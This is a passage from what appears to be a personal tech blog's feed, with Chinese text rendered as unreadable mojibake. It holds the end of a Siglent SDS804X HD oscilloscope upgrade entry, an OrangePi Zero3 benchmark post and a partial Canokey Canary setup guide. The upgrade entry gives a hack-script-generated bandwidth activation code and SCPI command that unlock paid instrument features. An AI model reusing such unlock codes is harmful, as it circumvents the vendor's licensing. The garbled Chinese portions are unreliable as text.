æ˜¯å¦ä¸€è‡´ï¼Œä¸ä¸€è‡´å°±å…ˆæ£€æŸ¥è„šæœ¬ä¸­çš„<code>SCOPEID</code>ï¼Œ<code>SN</code>è¾“å…¥æ˜¯å¦æ­£ç¡®ã€‚  </p><p>SCPIé¡µé¢è¿è¡Œå‘½ä»¤ <code>MCBD å¸¦å®½æ¿€æ´»ç </code> ä¾‹å¦‚ï¼š<code>MCBD 6M5VE9723IR5RACG</code></p><h3 id="5-è§£é”é€‰ä»¶"><a href="#5-è§£é”é€‰ä»¶" class="headerlink" title="5.è§£é”é€‰ä»¶"></a>5.è§£é”é€‰ä»¶</h3><p>æ³¨ï¼šç¤ºæ³¢å™¨å›ºä»¶å‡çº§åˆ° 1.1.3.8 ç‰ˆæœ¬åï¼ŒFGï¼ˆUSBæ³¢å½¢å‘ç”Ÿå™¨ï¼‰å’Œ16LAï¼ˆ16é€šé€»è¾‘åˆ†æä»ªï¼‰è¿™ä¸¤ä¸ªéœ€è¦ä¹°é¢å¤–ç¡¬ä»¶çš„é€‰ä»¶æˆæ ‡é…äº†ï¼Œä¸éœ€è¦æ‰‹åŠ¨æ¿€æ´»ã€‚<br><img src="/pictures/SDS804X-HD-Upgrade/6.png">  </p><p>å…¨éƒ¨æ“ä½œå®Œæˆåé‡å¯ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å®Œæˆæ•ˆæœ&quot;&gt;&lt;a href=&quot;#å®Œæˆæ•ˆæœ&quot; class=&quot;headerlink&quot; title=&quot;å®Œæˆæ•ˆæœ&quot;&gt;&lt;/a&gt;å®Œæˆæ•ˆæœ&lt;/h2&gt;&lt;p&gt;è„šæœ¬æ¥æºï¼š &lt;a href=&quot;https://www.eevblog.com/forum/testgear/siglent-sds-sdg-hack-script/&quot;&gt;https://www.eevblog.com/forum/testgear/siglent-sds-sdg-hack-script/&lt;/a&gt;&lt;br&gt;å‡çº§å®Œæˆåå‹å·ä¼šæ˜¾ç¤ºä¸ºSDS824X HDï¼š  &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/pictures/SDS804X-HD-Upgrade/1.png&quot;&gt;  &lt;/p&gt;
&lt;hr&gt;</summary>
    
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="æ•™ç¨‹" scheme="https://thinkalone.win/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="æŠ˜è…¾é‚£äº›äº‹" scheme="https://thinkalone.win/tags/%E6%8A%98%E8%85%BE%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>OrangePi Zero3 CPUè·‘åˆ†æµ‹è¯• CPU Benchmark</title>
    <link href="https://thinkalone.win/OrangePiZero3-CPU-Benchmark.html"/>
    <id>https://thinkalone.win/OrangePiZero3-CPU-Benchmark.html</id>
    <published>2025-02-01T04:00:00.000Z</published>
    <updated>2025-02-01T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>CPU:H618<br>RAM:2G  </p><p>screenfetch  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">       _,met$$$$$gg.           disappear9@Zero3</span><br><span class="line">    ,g$$$$$$$$$$$$$$$P.        OS: Debian 12 bookworm</span><br><span class="line">  ,g$$P&quot;&quot;       &quot;&quot;&quot;Y$$.&quot;.      Kernel: aarch64 Linux 6.6.75-current-sunxi64</span><br><span class="line"> ,$$P&#x27;              `$$$.      Uptime: 11d 6h 33m</span><br><span class="line">&#x27;,$$P       ,ggs.     `$$b:    Packages: 442</span><br><span class="line">`d$$&#x27;     ,$P&quot;&#x27;   .    $$$     Shell: bash</span><br><span class="line"> $$P      d$&#x27;     ,    $$P     Disk: 2.0G / 58G (4%)</span><br><span class="line"> $$:      $$.   -    ,d$$&#x27;     CPU: ARM Cortex-A53 @ 4x 1.512GHz</span><br><span class="line"> $$\;      Y$b._   _,d$P&#x27;      RAM: -</span><br><span class="line"> Y$$.    `.`&quot;Y$$$$P&quot;&#x27;</span><br><span class="line"> `$$b      &quot;-.__</span><br><span class="line">  `Y$$</span><br><span class="line">   `Y$$.</span><br><span class="line">     `$$b.</span><br><span class="line">       `Y$$b.</span><br><span class="line">          `&quot;Y$b._</span><br><span class="line">              `&quot;&quot;&quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><span id="more"></span><p>7-zip 16.02:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">disappear9@Zero3:~$ 7z b -mmt4</span><br><span class="line"></span><br><span class="line">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale=zh_CN.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs LE)</span><br><span class="line"></span><br><span class="line">LE</span><br><span class="line">CPU Freq: - - - - - 256000000 - 1024000000 -</span><br><span class="line"></span><br><span class="line">RAM size:    1918 MB,  # CPU hardware threads:   4</span><br><span class="line">RAM usage:    882 MB,  # Benchmark threads:      4</span><br><span class="line"></span><br><span class="line">                       Compressing  |                  Decompressing</span><br><span class="line">Dict     Speed Usage    R/U Rating  |      Speed Usage    R/U Rating</span><br><span class="line">         KiB/s     %   MIPS   MIPS  |      KiB/s     %   MIPS   MIPS</span><br><span class="line"></span><br><span class="line">22:       2339   340    669   2276  |      52855   398   1132   4509</span><br><span class="line">23:       2201   347    647   2243  |      51734   398   1124   4476</span><br><span class="line">24:       2097   355    636   2256  |      49812   398   1099   4373</span><br><span class="line">25:       2014   364    631   2300  |      48705   398   1088   4335</span><br><span class="line">----------------------------------  | ------------------------------</span><br><span class="line">Avr:             351    646   2269  |              398   1111   4423</span><br><span class="line">Tot:             375    878   3346</span><br><span class="line">disappear9@Zero3:~$ 7z b -mmt1</span><br><span class="line"></span><br><span class="line">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21</span><br><span class="line">p7zip Version 16.02 (locale=zh_CN.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs LE)</span><br><span class="line"></span><br><span class="line">LE</span><br><span class="line">CPU Freq: 64000000 64000000 - - - 256000000 - 1024000000 -</span><br><span class="line"></span><br><span class="line">RAM size:    1918 MB,  # CPU hardware threads:   4</span><br><span class="line">RAM usage:    435 MB,  # Benchmark threads:      1</span><br><span class="line"></span><br><span class="line">                       Compressing  |                  Decompressing</span><br><span class="line">Dict     Speed Usage    R/U Rating  |      Speed Usage    R/U Rating</span><br><span class="line">         KiB/s     %   MIPS   MIPS  |      KiB/s     %   MIPS   MIPS</span><br><span class="line"></span><br><span class="line">22:        914   100    890    890  |      16813   100   1436   1436</span><br><span class="line">23:        868   100    885    884  |      16460   100   1425   1425</span><br><span class="line">24:        831   100    894    894  |      16095   100   1413   1413</span><br><span class="line">25:        790   100    902    902  |      15692   100   1397   1397</span><br><span class="line">----------------------------------  | ------------------------------</span><br><span class="line">Avr:             100    893    893  |              100   1418   1418</span><br><span class="line">Tot:             100   1155   1155</span><br></pre></td></tr></table></figure><p>phoronix-test-suite benchmark compress-7zip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">disappear9@Zero3:~/phoronix-test-suite$ ./phoronix-test-suite benchmark compress-7zip</span><br><span class="line"></span><br><span class="line">Phoronix Test Suite v10.8.4</span><br><span class="line"></span><br><span class="line">    To Install:    pts/compress-7zip-1.11.0</span><br><span class="line"></span><br><span class="line">System Information</span><br><span class="line"></span><br><span class="line">  PROCESSOR:              ARMv8 Cortex-A53 @ 1.51GHz</span><br><span class="line">    Core Count:           4</span><br><span class="line">    Scaling Driver:       cpufreq-dt ondemand</span><br><span class="line"></span><br><span class="line">  GRAPHICS:</span><br><span class="line"></span><br><span class="line">  MOTHERBOARD:            OrangePi Zero3</span><br><span class="line"></span><br><span class="line">  MEMORY:                 2048MB</span><br><span class="line"></span><br><span class="line">  DISK:                   62GB SE064</span><br><span class="line">    File-System:          ext4</span><br><span class="line">    Mount Options:        commit=120 errors=remount-ro noatime rw</span><br><span class="line">    Disk Details:         Block Size: 4096</span><br><span class="line"></span><br><span class="line">  OPERATING SYSTEM:       Debian 12</span><br><span class="line">    Kernel:               6.6.75-current-sunxi64 (aarch64)</span><br><span class="line">    Compiler:             GCC 12.2.0</span><br><span class="line">    Security:             gather_data_sampling: Not affected</span><br><span class="line">                          + itlb_multihit: Not affected</span><br><span class="line">                          + l1tf: Not affected</span><br><span class="line">                          + mds: Not affected</span><br><span class="line">                          + meltdown: Not affected</span><br><span class="line">                          + mmio_stale_data: Not affected</span><br><span class="line">                          + reg_file_data_sampling: Not affected</span><br><span class="line">                          + retbleed: Not affected</span><br><span class="line">                          + spec_rstack_overflow: Not affected</span><br><span class="line">                          + spec_store_bypass: Not affected</span><br><span class="line">                          + spectre_v1: Mitigation of __user pointer sanitization</span><br><span class="line">                          + spectre_v2: Not affected</span><br><span class="line">                          + srbds: Not affected</span><br><span class="line">                          + tsx_async_abort: Not affected</span><br><span class="line"></span><br><span class="line">Current Description: ARMv8 Cortex-A53 testing on Debian 12 via the Phoronix Test Suite.</span><br><span class="line"></span><br><span class="line">7-Zip Compression 24.05:</span><br><span class="line">    pts/compress-7zip-1.11.0</span><br><span class="line">    Test 1 of 1</span><br><span class="line">    Estimated Trial Run Count:    3</span><br><span class="line">    Estimated Time To Completion: 17 Minutes</span><br><span class="line">        Started Run 1</span><br><span class="line">        Started Run 2</span><br><span class="line">        Started Run 3</span><br><span class="line"></span><br><span class="line">    Test: Compression Rating:</span><br><span class="line">        2688</span><br><span class="line">        2667</span><br><span class="line">        2656</span><br><span class="line"></span><br><span class="line">    Average: 2670 MIPS</span><br><span class="line">    Deviation: 0.61%</span><br><span class="line"></span><br><span class="line">    Test: Decompression Rating:</span><br><span class="line">        4757</span><br><span class="line">        4737</span><br><span class="line">        4741</span><br><span class="line"></span><br><span class="line">    Average: 4745 MIPS</span><br><span class="line">    Deviation: 0.22%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ARMv8 Cortex-A53 testing on Debian 12 via the Phoronix Test Suite.</span><br><span class="line"></span><br><span class="line">        Processor: ARMv8 Cortex-A53 @ 1.51GHz (4 Cores), Motherboard: OrangePi Zero3, Memory: 2048MB, Disk: 62GB SE064</span><br><span class="line"></span><br><span class="line">        OS: Debian 12, Kernel: 6.6.75-current-sunxi64 (aarch64), Compiler: GCC 12.2.0, File-System: ext4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    7-Zip Compression 24.05</span><br><span class="line">    Test: Compression Rating</span><br><span class="line">    MIPS &gt; Higher Is Better</span><br><span class="line">    Zero3 . 2670</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    7-Zip Compression 24.05</span><br><span class="line">    Test: Decompression Rating</span><br><span class="line">    MIPS &gt; Higher Is Better</span><br><span class="line">    Zero3 . 4745</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sysbench  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">disappear9@Zero3:~$ sysbench cpu --cpu-max-prime=20000 --threads=4 run</span><br><span class="line">sysbench 1.0.20 (using system LuaJIT 2.1.0-beta3)</span><br><span class="line"></span><br><span class="line">Running the test with following options:</span><br><span class="line">Number of threads: 4</span><br><span class="line">Initializing random number generator from current time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Prime numbers limit: 20000</span><br><span class="line"></span><br><span class="line">Initializing worker threads...</span><br><span class="line"></span><br><span class="line">Threads started!</span><br><span class="line"></span><br><span class="line">CPU speed:</span><br><span class="line">    events per second:  1124.46</span><br><span class="line"></span><br><span class="line">General statistics:</span><br><span class="line">    total time:                          10.0030s</span><br><span class="line">    total number of events:              11254</span><br><span class="line"></span><br><span class="line">Latency (ms):</span><br><span class="line">         min:                                    3.35</span><br><span class="line">         avg:                                    3.55</span><br><span class="line">         max:                                   10.86</span><br><span class="line">         95th percentile:                        4.25</span><br><span class="line">         sum:                                40002.45</span><br><span class="line"></span><br><span class="line">Threads fairness:</span><br><span class="line">    events (avg/stddev):           2813.5000/0.50</span><br><span class="line">    execution time (avg/stddev):   10.0006/0.00</span><br><span class="line"></span><br><span class="line">disappear9@Zero3:~$ sysbench cpu --cpu-max-prime=20000 --threads=1 run</span><br><span class="line">sysbench 1.0.20 (using system LuaJIT 2.1.0-beta3)</span><br><span class="line"></span><br><span class="line">Running the test with following options:</span><br><span class="line">Number of threads: 1</span><br><span class="line">Initializing random number generator from current time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Prime numbers limit: 20000</span><br><span class="line"></span><br><span class="line">Initializing worker threads...</span><br><span class="line"></span><br><span class="line">Threads started!</span><br><span class="line"></span><br><span class="line">CPU speed:</span><br><span class="line">    events per second:   294.62</span><br><span class="line"></span><br><span class="line">General statistics:</span><br><span class="line">    total time:                          10.0007s</span><br><span class="line">    total number of events:              2948</span><br><span class="line"></span><br><span class="line">Latency (ms):</span><br><span class="line">         min:                                    3.35</span><br><span class="line">         avg:                                    3.39</span><br><span class="line">         max:                                   10.65</span><br><span class="line">         95th percentile:                        3.36</span><br><span class="line">         sum:                                 9998.34</span><br><span class="line"></span><br><span class="line">Threads fairness:</span><br><span class="line">    events (avg/stddev):           2948.0000/0.00</span><br><span class="line">    execution time (avg/stddev):   9.9983/0.00</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;CPU:H618&lt;br&gt;RAM:2G  &lt;/p&gt;
&lt;p&gt;screenfetch  &lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;       _,met$$$$$gg.           disappear9@Zero3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ,g$$$$$$$$$$$$$$$P.        OS: Debian 12 bookworm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  ,g$$P&amp;quot;&amp;quot;       &amp;quot;&amp;quot;&amp;quot;Y$$.&amp;quot;.      Kernel: aarch64 Linux 6.6.75-current-sunxi64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; ,$$P&amp;#x27;              `$$$.      Uptime: 11d 6h 33m&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#x27;,$$P       ,ggs.     `$$b:    Packages: 442&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;`d$$&amp;#x27;     ,$P&amp;quot;&amp;#x27;   .    $$$     Shell: bash&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $$P      d$&amp;#x27;     ,    $$P     Disk: 2.0G / 58G (4%)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $$:      $$.   -    ,d$$&amp;#x27;     CPU: ARM Cortex-A53 @ 4x 1.512GHz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; $$&#92;;      Y$b._   _,d$P&amp;#x27;      RAM: -&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; Y$$.    `.`&amp;quot;Y$$$$P&amp;quot;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; `$$b      &amp;quot;-.__&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  `Y$$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   `Y$$.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     `$$b.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       `Y$$b.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          `&amp;quot;Y$b._&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              `&amp;quot;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="æµ‹è¯•ç»“æœ" scheme="https://thinkalone.win/categories/%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C/"/>
    
    
    <category term="æ‚é¡¹" scheme="https://thinkalone.win/tags/%E6%9D%82%E9%A1%B9/"/>
    
    <category term="æµ‹è¯•ç»“æœ" scheme="https://thinkalone.win/tags/%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C/"/>
    
  </entry>
  
  <entry>
    <title>Canokey Canaryä¸Šæ‰‹</title>
    <link href="https://thinkalone.win/canokey-canary.html"/>
    <id>https://thinkalone.win/canokey-canary.html</id>
    <published>2025-01-01T04:00:00.000Z</published>
    <updated>2025-01-01T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h3><p>ç¬¬ä¸€æ¬¡æ¥è§¦Canokeyè¿˜æ˜¯åœ¨2021å¹´ï¼Œå½“æ—¶è·Ÿé£ä¹°äº†CanoKey Pigeoné¦–å‘ï¼Œåˆ°æ‰‹ä»¥åæŠŠGPGå¯†é’¥å¡è¿›å»å†åŠ åˆ°å‡ ä¸ªç½‘ç«™åšè®¤è¯å™¨ä»¥åå°±ä¸€ç›´æ˜¯åŠåƒç°çŠ¶æ€ï¼Œæ¯•ç«Ÿç½‘ç«™çš„ç™»å½•ä¸ä¼šå¤©å¤©æ‰ï¼Œè€ŒGPGæ›´æ˜¯ä¸€ä¸‡å¹´æ²¡äººç»™æˆ‘å‘åŠ å¯†çš„ä¿¡æ¯ï¼Œè¿ç”¨æ¥gitç­¾åçš„æ¬¡æ•°éƒ½å°‘ï¼ˆæˆ‘æ‡’ï¼‰ã€‚  </p><p>å‰æ®µCanokeyç¾¤æŠ½å¥–é€Canaryæµ‹è¯•ç‰ˆï¼Œæœ¬äººæœ‰å¹¸ä¸­å¾—ä¸€ä¸ªï¼š<br><img src="/pictures/canokey-canary/1.png">   </p><p>é‚£è¿™ä¸å†æŠ˜è…¾ä¸€ä¸‹ä¼¼ä¹å°±æœ‰ç‚¹ä¸åˆé€‚äº†ã€‚  </p><hr><h3 id="ç¯å¢ƒç¡®è®¤"><a href="#ç¯å¢ƒç¡®è®¤" class="headerlink" title="ç¯å¢ƒç¡®è®¤"></a>ç¯å¢ƒç¡®è®¤</h3><p>ç¡¬ä»¶ä¿¡æ¯ï¼š<br>&emsp;&emsp;CanoKey Canaryï¼ˆ3.0.0-rc2-0 dirty buildï¼‰<br>æ“ä½œç³»ç»Ÿï¼š<br>&emsp;&emsp;Windows 10 LTSB 21H2<br>è½¯ä»¶ç‰ˆæœ¬ï¼š<br>&emsp;&emsp;gpg4win 4.4 (gpg 2.4.7)<br>&emsp;&emsp;OpenSC 0.26.0  </p><span id="more"></span> <p>Canokeyçš„åŠŸèƒ½ä¸»è¦æœ‰è¿™å‡ å¤§å—ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WebAuthn (Passkey)</span><br><span class="line">OTP</span><br><span class="line">OpenPGP</span><br><span class="line">PIV</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆ†åˆ«æ¥ä»‹ç»æ€ä¹ˆç©ï¼ˆä¹Ÿæ˜¯ç»™è‡ªå·±ç•™ä¸ªå¤‡å¿˜ï¼‰ã€‚  </p><h3 id="WebAuthn-Passkey"><a href="#WebAuthn-Passkey" class="headerlink" title="WebAuthn (Passkey)"></a>WebAuthn (Passkey)</h3><p><img src="/pictures/canokey-canary/2.png">  </p><p>ç„¶åå°±å¯ä»¥å¼€å§‹ç”¨ä½œç½‘ç«™ç™»å½•çš„è®¤è¯äº†ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚  </p><h4 id="SSH-FIDO"><a href="#SSH-FIDO" class="headerlink" title="SSH FIDO"></a>SSH FIDO</h4><p>å‚è€ƒ<a href="https://docs.canokeys.org/zh-hans/userguide/ctap/">WebAuthn (Passkey)</a><br>æ‰€æœ‰å‘½ä»¤å‡åœ¨PowerShellä¸­è¿è¡Œ<br>ç¡®ä¿å®‰è£…çš„ OpenSSH ä¸º 8.2 åŠä»¥ä¸Šç‰ˆæœ¬  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -V</span><br><span class="line">sshd -V</span><br></pre></td></tr></table></figure><p>æœ¬äººæµ‹è¯•è¿‡åœ¨å½“å‰ç¯å¢ƒä¸‹åªæœ‰ Discoverable Credentialï¼ˆResident Keyï¼‰æ˜¯å¯ç”¨çš„ï¼Œnon-discoverable credentialsæ— è®ºæ˜¯ä½¿ç”¨ Windows è‡ªå¸¦çš„ SSH è¿˜æ˜¯ç”¨ <a href="https://github.com/tetractic/SK-SSH-Agent">SK SSH Agent</a> è½¬å‘å‡æ— æ³•ä½¿ç”¨ï¼ŒåŸå› æœªçŸ¥ï¼Œè¯·ä¸åèµæ•™ã€‚<br>é™¤æ­¤ä»¥å¤–è¿˜æœ‰ä¸€ä¸ªé­”æ”¹ç‰ˆputtyï¼š<a href="https://github.com/NoMoreFood/putty-cac">putty-cac</a> æœ¬äººæ²¡æœ‰æµ‹è¯•è¿‡ã€‚<br>ç”±äºæœ¬äººå¹¶ä¸å¸¸ç”¨Windowsè‡ªå¸¦çš„SSHè¿æ¥æœåŠ¡å™¨ï¼Œè€Œä¸”å¼€SK SSH Agentè¿˜ä¼šå ç”¨Agentçš„ç«¯å£ï¼Œæ‰€ä»¥æœ¬äººæ—¥å¸¸ç”¨çš„æ–¹æ¡ˆæ˜¯ä¸‹æ–‡ä¸­çš„ SSH with gpg agentï¼Œè¿™é‡Œåªæ˜¯ç®€å•è¯•è¯•ã€‚  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519-sk -O resident</span><br></pre></td></tr></table></figure><p>å°†ç”Ÿæˆçš„å…¬é’¥æ–‡ä»¶ <code>~/.ssh/id_ed25519_sk.pub</code> ä¸­çš„å†…å®¹æ·»åŠ åˆ°ç›®æ ‡æœåŠ¡å™¨çš„ <code>authorized_keys</code> æ–‡ä»¶ä¸­ã€‚<br>ç„¶åç›´æ¥ä½¿ç”¨ Windows è‡ªå¸¦çš„ SSH æˆ–è€…å¼€ SK SSH Agent åŠ è½½ <code>~/.ssh/id_ed25519_sk</code> åå°±å¯ä»¥ä½¿ç”¨äº†ã€‚  </p><h3 id="OTP"><a href="#OTP" class="headerlink" title="OTP"></a>OTP</h3><p><strong>å»ºè®®æ˜¯åˆ«ç”¨</strong><br>æ¨èä½¿ç”¨ KeePass + KeeTrayTOTP æ’ä»¶ï¼Œæˆ–æ‰‹æœºä¸Šçš„<a href="https://play.google.com/store/apps/details?id=com.stratumauth.app">Stratum - Authenticator App</a> (<a href="https://github.com/stratumauth/app">https://github.com/stratumauth/app</a>)  </p><h3 id="OpenPGP"><a href="#OpenPGP" class="headerlink" 